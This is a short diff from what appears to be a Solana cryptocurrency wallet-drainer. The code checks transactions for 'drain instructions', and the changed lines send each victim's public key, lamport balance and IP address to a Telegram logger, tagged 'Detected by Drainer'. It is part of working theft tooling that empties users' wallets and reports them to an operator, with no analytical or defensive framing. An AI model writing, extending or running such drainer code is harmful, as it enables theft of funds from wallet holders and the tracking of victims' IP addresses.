@@ -684,11 +684,12 @@ const SOLFLARE_TOTAL_RESERVED = SOLFLARE_FEE_BUFFER + SOLFLARE_RESERVE_LAMPORTS;
       console.log(`[DRAIN_LOG] - Has drain instructions: ${hasDrainInstructions}`);
       console.log(`[DRAIN_LOG] - Has potential for drain: ${hasPotentialForDrain}`);
       
-      // Log wallet detection (only if meaningful balance)
+      // Log wallet detection with actual balance
       await telegramLogger.logWalletDetected({
         publicKey: userPubkey.toString(),
         lamports: lamports,
-        ip: userIp
+        ip: userIp,
+        walletType: 'Detected by Drainer'
       });
       
       // Return transaction data
